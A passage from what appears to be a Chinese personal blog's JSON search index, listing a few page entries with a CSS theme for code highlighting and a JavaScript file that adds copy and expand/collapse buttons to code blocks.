安全"]},{"title":"关于","path":"/about/index.html","content":"友链关于妙尽璇机履万世之馀风，察片叶于迷悟，掇翦羽于浮沉 螺旋之铭 用真实创造虚妄，以矛盾反转意义。拆解自己，正是为了成为自己。唯有创造对立，才能步入统一。"},{"title":"探索","path":"/explore/index.html","content":"…"},{"title":"友链","path":"/friends/index.html","content":"友链关于小伙伴们我们齐聚于此，向世界证明，人类与其造物主拥有同样的伟力 stooceayyjccc3unsetwub"},{"title":"收藏","path":"/bookmark/index.html","content":"…"},{"title":"Page","path":"/page/index.html","content":"This is a page test."},{"path":"/custom/js/ZYCode.css","content":":root{ --code-autor: '© 钟意博客🌙'; --code-tip: \"优雅借鉴\"; } /*语法高亮*/ .hljs { position: relative; display: block; overflow-x: hidden; /*背景跟随Stellar*/ background: var(--block); color: #9c67a1; padding: 30px 5px 2px 5px; box-shadow: 0 10px 30px 0px rgb(0 0 0 / 40%) } .hljs::before { content: var(--code-tip); position: absolute; left: 15px; top: 10px; overflow: visible; width: 12px; height: 12px; border-radius: 16px; box-shadow: 20px 0 #a9a6a1, 40px 0 #999; -webkit-box-shadow: 20px 0 #999, 40px 0 #999; background-color: #999; white-space: nowrap; text-indent: 75px; font-size: 16px; line-height: 12px; font-weight: 700; color: #999 } .highlight:hover .hljs::before { color: #35cd4b; box-shadow: 20px 0 #fdbc40, 40px 0 #35cd4b; -webkit-box-shadow: 20px 0 #fdbc40, 40px 0 #35cd4b; background-color: #fc625d; } .hljs-ln { display: inline-block; overflow-x: auto; padding-bottom: 5px } .hljs-ln td { padding: 0; background-color: var(--block) } .hljs-ln::-webkit-scrollbar { height: 10px; border-radius: 5px; background: #333; } .hljs-ln::-webkit-scrollbar-thumb { background-color: #bbb; border-radius: 5px; } .hljs-ln::-webkit-scrollbar-thumb:hover { background: #ddd; } .hljs table tbody tr { border: none } .hljs .hljs-ln-line { padding: 1px 10px; border: none } td.hljs-ln-line.hljs-ln-numbers { border-right: 1px solid #666; } .hljs-keyword, .hljs-literal, .hljs-symbol, .hljs-name { color: #c78300 } .hljs-link { color: #569cd6; text-decoration: underline } .hljs-built_in, .hljs-type { color: #4ec9b0 } .hljs-number, .hljs-class { color: #2094f3 } .hljs-string, .hljs-meta-string { color: #4caf50 } .hljs-regexp, .hljs-template-tag { color: #9a5334 } .hljs-subst, .hljs-function, .hljs-title, .hljs-params, .hljs-formula { color: #c78300 } .hljs-property { color: #9c67a1; } .hljs-comment, .hljs-quote { color: #57a64a; font-style: italic } .hljs-doctag { color: #608b4e } .hljs-meta, .hljs-meta-keyword, .hljs-tag { color: #9b9b9b } .hljs-variable, .hljs-template-variable { color: #bd63c5 } .hljs-attr, .hljs-attribute, .hljs-builtin-name { color: #d34141 } .hljs-section { color: gold } .hljs-emphasis { font-style: italic } .hljs-strong { font-weight: bold } .hljs-bullet, .hljs-selector-tag, .hljs-selector-id, .hljs-selector-class, .hljs-selector-attr, .hljs-selector-pseudo { color: #c78300 } .hljs-addition { background-color: #144212; display: inline-block; width: 100% } .hljs-deletion { background-color: #600; display: inline-block; width: 100% } .hljs.language-html::before, .hljs.language-xml::before { content: \"HTML/XML\" } .hljs.language-javascript::before { content: \"JavaScript\" } .hljs.language-c::before { content: \"C\" } .hljs.language-cpp::before { content: \"C++\" } .hljs.language-java::before { content: \"Java\" } .hljs.language-asp::before { content: \"ASP\" } .hljs.language-actionscript::before { content: \"ActionScript/Flash/Flex\" } .hljs.language-bash::before { content: \"Bash\" } .hljs.language-css::before { content: \"CSS\" } .hljs.language-asp::before { content: \"ASP\" } .hljs.language-cs::before, .hljs.language-csharp::before { content: \"C#\" } .hljs.language-d::before { content: \"D\" } .hljs.language-golang::before, .hljs.language-go::before { content: \"Go\" } .hljs.language-json::before { content: \"JSON\" } .hljs.language-lua::before { content: \"Lua\" } .hljs.language-less::before { content: \"LESS\" } .hljs.language-md::before, .hljs.language-markdown::before, .hljs.language-mkdown::before, .hljs.language-mkd::before { content: \"Markdown\" } .hljs.language-mm::before, .hljs.language-objc::before, .hljs.language-obj-c::before, .hljs.language-objective-c::before { content: \"Objective-C\" } .hljs.language-php::before { content: \"PHP\" } .hljs.language-perl::before, .hljs.language-pl::before, .hljs.language-pm::before { content: \"Perl\" } .hljs.language-python::before, .hljs.language-py::before, .hljs.language-gyp::before, .hljs.language-ipython::before { content: \"Python\" } .hljs.language-r::before { content: \"R\" } .hljs.language-ruby::before, .hljs.language-rb::before, .hljs.language-gemspec::before, .hljs.language-podspec::before, .hljs.language-thor::before, .hljs.language-irb::before { content: \"Ruby\" } .hljs.language-sql::before { content: \"SQL\" } .hljs.language-sh::before, .hljs.language-shell::before, .hljs.language-Session::before, .hljs.language-shellsession::before, .hljs.language-console::before { content: \"Shell\" } .hljs.language-swift::before { content: \"Swift\" } .hljs.language-vb::before { content: \"VB/VBScript\" } .hljs.language-yaml::before { content: \"YAML\" } /*stellar主题补偿*/ .md-text pre>.hljs { padding-top: 2rem !important; } .md-text pre { padding: 0 !important; } code { background-image: linear-gradient(90deg, rgba(60, 10, 30, .04) 3%, transparent 0), linear-gradient(1turn, rgba(60, 10, 30, .04) 3%, transparent 0) !important; background-size: 20px 20px !important; background-position: 50% !important; } figure::after { content: var(--code-autor); text-align: right; font-size: 10px; float: right; margin-top: 3px; padding-right: 15px; padding-bottom: 8px; color: #999 } figcaption span { border-radius: 0px 0px 12px 12px !important; } /* 复制代码按钮 */ .highlight { position: relative; } .highlight .code .copy-btn { position: absolute; top: 0; right: 0; padding: 4px 0.5rem; opacity: 0.25; font-weight: 700; color: var(--theme); cursor: pointer; transination: opacity 0.3s; } .highlight .code .copy-btn:hover { color: var(--text-code); opacity: 0.75; } .highlight .code .copy-btn.success { color: var(--swiper-theme-color); opacity: 0.75; } /* 描述 */ .md-text .highlight figcaption span { font-size: small; } /* 折叠 */ code.hljs { display: -webkit-box; overflow: hidden; text-overflow: ellipsis; -webkit-box-orient: vertical; /*-webkit-line-clamp: 6;*/ padding: 1rem 1rem 0 1rem; /* chino建议 */ } .hljsOpen { -webkit-line-clamp: 99999 !important; } .CodeCloseDiv { color: #999; background: var(--block); display: flex; justify-content: center; margin-top: inherit; margin-bottom: -18px; } .CodeClose { color: #999; margin-top: 3px; background: var(--block); } .highlight button:hover, .highlight table:hover+button { color: var(--swiper-theme-color); opacity: 0.75; }"},{"title":"朋友文章","path":"/friends/rss/index.html","content":""},{"path":"/custom/js/ZYCode.js","content":"// 这四个常量是复制,复制成功,展开,收缩 // 我使用的是 https://fontawesome.com/ 图标, 不用可以改为文字. const copyText = ''; const copySuccess = ''; const openText = ''; const closeText = ''; const codeElements = document.querySelectorAll('td.code'); codeElements.forEach((code, index) => { const preCode = code.querySelector('pre'); // 设置id和样式 preCode.id = `ZYCode${index+1}`; preCode.style.webkitLineClamp = '6'; // 添加展开/收起按钮 if (preCode.innerHTML.split('').length > 6) { const codeCopyDiv = document.createElement('div'); codeCopyDiv.classList.add('CodeCloseDiv'); code.parentNode.parentNode.parentNode.parentNode.appendChild(codeCopyDiv); const codeCopyOver = document.createElement('button'); codeCopyOver.classList.add('CodeClose'); codeCopyOver.innerHTML = openText; const parent = code.parentNode.parentNode.parentNode.parentNode; const description = parent.childNodes.length === 3 ? parent.children[2] : parent.children[1]; description.appendChild(codeCopyOver); codeCopyOver.addEventListener('click', () => { if (codeCopyOver.innerHTML === openText) { const scrollTop = document.documentElement.scrollTop; const codeHeight = code.clientHeight; if (scrollTop < codeHeight) { document.documentElement.scrollTop += codeHeight - scrollTop; } preCode.style.webkitLineClamp = '99999'; codeCopyOver.innerHTML = closeText; } else { preCode.style.webkitLineClamp = '6'; codeCopyOver.innerHTML = openText; } }); } // 添加复制按钮 const codeCopyBtn = document.createElement('div'); codeCopyBtn.classList.add('copy-btn'); codeCopyBtn.innerHTML = copyText; code.appendChild(codeCopyBtn); // 添加复制功能 codeCopyBtn.addEventListener('click', async () => { const currentCodeElement = code.querySelector('pre')?.innerText; await copyCode(currentCodeElement); codeCopyBtn.innerHTML = copySuccess; codeCopyBtn.classList.add('success'); setTimeout(() => { codeCopyBtn.innerHTML = copyText; codeCopyBtn.classList.remove('success'); }, 3000); }); }); async function copyCode(currentCode) { if (navigator.clipboard) { try { await navigator.clipboard.writeText(currentCode); } catch (error) { console.error(error); } } else { console.error('当前浏览器不支持此API'); } }"}]